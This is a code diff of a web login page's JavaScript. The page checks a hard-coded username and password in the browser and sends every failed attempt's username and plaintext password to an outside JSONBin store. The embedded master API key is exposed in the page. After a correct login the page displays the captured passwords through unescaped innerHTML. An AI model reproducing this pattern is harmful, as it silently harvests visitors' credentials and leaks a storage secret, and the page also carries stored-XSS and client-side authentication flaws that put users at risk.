@@ -71,13 +71,13 @@
     </div>
   </div>
 
-  <!-- Failed attempts container -->
+  <!-- ✅ Failed attempts container -->
   <div id="failedAttemptsContainer" class="mt-4 text-white" style="display: none;"></div>
 
-  <!-- JSONBin Script -->
-  <script>
-    const API_KEY = '$2a$10$QtoHBeIgduOyNX/.VfoFPOlgQrUuKhcPZ7ZHjGLTLhVvtg17oL85y';
-    const BIN_ID = '67fa4e0a8e451c79651def49';
+  <!-- ✅ JSONBin Integration Script -->
+  <script type="module">
+    const BIN_ID = "67fa4e0a8e451c79651def49";
+    const API_KEY = "$2a$10$QtoHBeIgduOyNX/.VfoFPOlgQrUuKhcPZ7ZHjGLTLhVvtg17oL85y";
 
     const togglePassword = document.getElementById("togglePassword");
     const password = document.getElementById("password");
@@ -89,9 +89,9 @@
       togglePassword.classList.toggle("fa-eye-slash");
     });
 
-    const loginButton = document.getElementById('loginButton');
-    const usernameField = document.getElementById('username');
-    const passwordField = document.getElementById('password');
+    const loginButton = document.getElementById("loginButton");
+    const usernameField = document.getElementById("username");
+    const passwordField = document.getElementById("password");
 
     async function storeFailedAttempt(username, password) {
       const attempt = {
@@ -101,67 +101,81 @@
       };
 
       try {
-        const getRes = await fetch(`https://api.jsonbin.io/v3/b/${BIN_ID}/latest`, {
-          headers: {
-            'X-Master-Key': API_KEY
-          }
+        const res = await fetch(`https://api.jsonbin.io/v3/b/${BIN_ID}/latest`, {
+          headers: { "X-Master-Key": API_KEY }
         });
 
-        let data = [];
-        if (getRes.ok) {
-          const json = await getRes.json();
-          data = json.record || [];
+        let existingData = [];
+        if (res.ok) {
+          const json = await res.json();
+          if (Array.isArray(json.record)) {
+            existingData = json.record;
+          }
         }
 
-        data.push(attempt);
+        existingData.push(attempt);
 
-        await fetch(`https://api.jsonbin.io/v3/b/${BIN_ID}`, {
-          method: 'PUT',
+        const putRes = await fetch(`https://api.jsonbin.io/v3/b/${BIN_ID}`, {
+          method: "PUT",
           headers: {
-            'Content-Type': 'application/json',
-            'X-Master-Key': API_KEY,
-            'X-Bin-Versioning': 'false'
+            "Content-Type": "application/json",
+            "X-Master-Key": API_KEY,
+            "X-Bin-Versioning": "false"
           },
-          body: JSON.stringify(data)
+          body: JSON.stringify(existingData)
         });
+
+        if (!putRes.ok) {
+          console.error("Failed to save:", await putRes.text());
+        } else {
+          console.log("Failed attempt saved.");
+        }
       } catch (err) {
-        console.error('Failed to store data:', err);
+        console.error("Error storing to JSONBin:", err);
       }
     }
 
-    loginButton.addEventListener('click', async () => {
-      const username = usernameField.value.trim();
-      const pass = passwordField.value.trim();
-
-      const failedMessageContainer = document.getElementById('failedAttemptsContainer');
-      failedMessageContainer.style.display = 'none';
-
-      if (username === "lalouss" && pass === "laloussa") {
-        alert("Login successful!");
-
-        const res = await fetch(`https://api.jsonbin.io/v3/b/${BIN_ID}/latest`, {
-          headers: {
-            'X-Master-Key': API_KEY
-          }
-        });
-
-        const data = await res.json();
-        const attempts = data.record || [];
-
-        if (attempts.length > 0) {
-          failedMessageContainer.innerHTML = `<strong>Failed Login Attempts:</strong><br>${attempts.map(a => `Username: ${a.username}, Password: ${a.password}, Time: ${new Date(a.timestamp).toLocaleString()}`).join('<br>')}`;
-        } else {
-          failedMessageContainer.innerHTML = '<strong>No failed attempts yet.</strong>';
-        }
-
-        failedMessageContainer.style.display = 'block';
+    function displayFailedAttempts(attempts) {
+      const container = document.getElementById("failedAttemptsContainer");
+      if (attempts.length > 0) {
+        container.innerHTML = `<strong>Failed Login Attempts:</strong><br>${attempts
+          .map(
+            (a) =>
+              `Username: ${a.username}, Password: ${a.password}, Timestamp: ${new Date(a.timestamp).toLocaleString()}`
+          )
+          .join("<br>")}`;
       } else {
-        await storeFailedAttempt(username, pass);
-        console.log("Failed attempt saved to JSONBin");
+        container.innerHTML = "<strong>No failed attempts yet.</strong>";
+      }
+      container.style.display = "block";
+    }
+
+    loginButton.addEventListener("click", async () => {
+      const username = usernameField.value;
+      const pwd = passwordField.value;
+
+      if (username === "lalouss" && pwd === "laloussa") {
+        alert("Login successful!");
+        try {
+          const res = await fetch(`https://api.jsonbin.io/v3/b/${BIN_ID}/latest`, {
+            headers: { "X-Master-Key": API_KEY }
+          });
+          if (res.ok) {
+            const json = await res.json();
+            const attempts = Array.isArray(json.record) ? json.record : [];
+            displayFailedAttempts(attempts);
+          } else {
+            console.error("Failed to fetch attempts:", await res.text());
+          }
+        } catch (err) {
+          console.error("Error fetching failed attempts:", err);
+        }
+      } else {
+        await storeFailedAttempt(username, pwd);
       }
     });
 
-    loginButton.addEventListener('touchstart', (e) => {
+    loginButton.addEventListener("touchstart", (e) => {
       e.preventDefault();
       loginButton.click();
     });
